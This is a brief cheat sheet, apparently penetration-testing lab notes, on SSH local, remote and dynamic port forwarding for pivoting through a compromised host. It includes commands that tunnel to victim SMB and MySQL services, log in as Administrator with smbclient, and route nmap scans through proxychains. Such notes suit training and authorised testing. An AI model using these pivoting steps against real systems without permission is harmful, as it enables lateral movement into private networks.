

SSH Local Port Forwarding:
--------------------------
--in local network--

ssh -N -L [bind_address]:port:<ip_address_victim>:victim_port [username@ip_address_compromised]

example: 
sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128

**note**
if we try to hack a win server 2016 we need to change the smb.conf file:
kali@kali:~$ sudo nano /etc/samba/smb.conf
+add to end of file----->min protocol = SMB2
kali@kali:~$ sudo /etc/init.d/smbd restart
**end note**


now we can watch shared folders with smbclient :
kali@kali:~# smbclient -L 127.0.0.1 -U Administrator

==============================================================

SSH Remote Port Forwarding:
---------------------------

on victim machine:

ssh -N -R [ip_address_attacker:]port:host:victim_port [username@ip_address_attacker]

example:
student@debian:~$ ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4

**note** : 
With the tunnel up, we can switch to our Kali machine, validate that TCP port 2221 is listening, and
scan the localhost on that port with nmap , which will fingerprint the targetâ€™s MySQL service.

============================================================================================
 
SSH Dynamic Port Forwarding:
----------------------------
allows us to set a local listening port
and have it tunnel incoming traffic to any remote destination through the use of a proxy.

--on attacker machine--:

1. ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>

example:
kali@kali:~$ sudo ssh -N -D 127.0.0.1:8080 student@ip_address_compromised_victim

set ptoxy:
2. kali@kali:~$ cat /etc/proxychains.conf
...
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4 127.0.0.1 8080  (<----add this line)

3. now run the command you need with proxychines, for example:
kali@kali:~$ sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110
